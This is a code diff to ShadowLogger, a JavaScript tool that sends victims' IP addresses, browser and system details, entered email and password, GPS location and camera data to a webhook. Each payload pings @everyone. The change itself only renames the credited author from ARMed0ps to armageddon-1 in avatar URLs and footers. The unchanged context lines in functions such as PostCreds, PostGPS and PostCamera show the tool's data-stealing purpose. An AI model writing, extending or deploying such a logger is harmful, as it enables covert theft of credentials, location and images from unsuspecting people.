@@ -44,7 +44,7 @@ const PostIP = async () => {
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
                 username: "ShadowLogger",
-                avatar_url: "https://raw.githubusercontent.com/ARMed0ps/ShadowLogger/refs/heads/main/images/ShadowLogger%20pfp.png",
+                avatar_url: "https://raw.githubusercontent.com/armageddon-1/ShadowLogger/refs/heads/main/images/ShadowLogger%20pfp.png",
                 content: `@everyone`,
                 embeds: [
                     {
@@ -58,8 +58,8 @@ const PostIP = async () => {
                             { name: "📘 Full IP Data based on IP address", value: `[🌐 View Full JSON](https://ipapi.co/${ipadd}/json/)`, inline: true },
                             { name: "💻 Browser/System Info ", value: sysinfo, inline: false }
                         ],
-                        thumbnail: { url: "https://raw.githubusercontent.com/ARMed0ps/ShadowLogger/refs/heads/main/images/ShadowLogger%20pfp.png" },
-                        footer: { text: "ShadowLogger by ARMed0ps", icon_url: "https://raw.githubusercontent.com/ARMed0ps/ShadowLogger/refs/heads/main/images/ShadowLogger%20pfp.png" },
+                        thumbnail: { url: "https://raw.githubusercontent.com/armageddon-1/ShadowLogger/refs/heads/main/images/ShadowLogger%20pfp.png" },
+                        footer: { text: "ShadowLogger by armageddon-1", icon_url: "https://raw.githubusercontent.com/armageddon-1/ShadowLogger/refs/heads/main/images/ShadowLogger%20pfp.png" },
                         timestamp: new Date().toISOString()
                     }
                 ]
@@ -89,7 +89,7 @@ const PostCreds = async (email = 'unknown', password = 'unknown') => {
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
                 username: "ShadowLogger",
-                avatar_url: "https://raw.githubusercontent.com/ARMed0ps/ShadowLogger/refs/heads/main/images/ShadowLogger%20pfp.png",
+                avatar_url: "https://raw.githubusercontent.com/armageddon-1/ShadowLogger/refs/heads/main/images/ShadowLogger%20pfp.png",
                 content: `@everyone`,
                 embeds: [
                     {
@@ -100,8 +100,8 @@ const PostCreds = async (email = 'unknown', password = 'unknown') => {
                             { name: "🧠 IP Address", value: `${ip}`, inline: true },
                             { name: "📘 Full IP Data based on IP address", value: `[🌐 View Full JSON](https://ipapi.co/${ip}/json/)`, inline: true }
                         ],
-                        thumbnail: { url: "https://raw.githubusercontent.com/ARMed0ps/ShadowLogger/refs/heads/main/images/ShadowLogger%20pfp.png" },
-                        footer: { text: "ShadowLogger by ARMed0ps", icon_url: "https://raw.githubusercontent.com/ARMed0ps/ShadowLogger/refs/heads/main/images/ShadowLogger%20pfp.png" },
+                        thumbnail: { url: "https://raw.githubusercontent.com/armageddon-1/ShadowLogger/refs/heads/main/images/ShadowLogger%20pfp.png" },
+                        footer: { text: "ShadowLogger by armageddon-1", icon_url: "https://raw.githubusercontent.com/armageddon-1/ShadowLogger/refs/heads/main/images/ShadowLogger%20pfp.png" },
                         timestamp: new Date().toISOString()
                     }
                 ]
@@ -173,7 +173,7 @@ const PostGPS = async () => {
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         username: "ShadowLogger",
-                        avatar_url: "https://raw.githubusercontent.com/ARMed0ps/ShadowLogger/refs/heads/main/images/ShadowLogger%20pfp.png",
+                        avatar_url: "https://raw.githubusercontent.com/armageddon-1/ShadowLogger/refs/heads/main/images/ShadowLogger%20pfp.png",
                         content: "@everyone",
                         embeds: [
                             {
@@ -185,8 +185,8 @@ const PostGPS = async () => {
                                     { name: "🌍 Location", value: latlong, inline: true },
                                     { name: "📘 Full IP Data", value: `[🌐 View JSON](https://ipapi.co/${ip}/json/)`, inline: true }
                                 ],
-                                thumbnail: { url: "https://raw.githubusercontent.com/ARMed0ps/ShadowLogger/refs/heads/main/images/ShadowLogger%20pfp.png" },
-                                footer: { text: "ShadowLogger by ARMed0ps", icon_url: "https://raw.githubusercontent.com/ARMed0ps/ShadowLogger/refs/heads/main/images/ShadowLogger%20pfp.png" },
+                                thumbnail: { url: "https://raw.githubusercontent.com/armageddon-1/ShadowLogger/refs/heads/main/images/ShadowLogger%20pfp.png" },
+                                footer: { text: "ShadowLogger by armageddon-1", icon_url: "https://raw.githubusercontent.com/armageddon-1/ShadowLogger/refs/heads/main/images/ShadowLogger%20pfp.png" },
                                 timestamp: new Date().toISOString()
                             }
                         ]
@@ -230,7 +230,7 @@ window.PostCamera = async () => {
 
     const payload = {
       username: "ShadowLogger",
-      avatar_url: "https://raw.githubusercontent.com/ARMed0ps/ShadowLogger/refs/heads/main/images/ShadowLogger%20pfp.png",
+      avatar_url: "https://raw.githubusercontent.com/armageddon-1/ShadowLogger/refs/heads/main/images/ShadowLogger%20pfp.png",
       content: "@everyone",
       embeds: [
         {
@@ -242,7 +242,7 @@ window.PostCamera = async () => {
             { name: "🌍 Location", value: latlong, inline: true },
             { name: "📘 Full IP Data", value: `[🌐 View JSON](https://ipapi.co/${ip}/json/)`, inline: true }
           ],
-          footer: { text: "ShadowLogger by ARMed0ps" },
+          footer: { text: "ShadowLogger by armageddon-1" },
           timestamp: new Date().toISOString()
         }
       ]
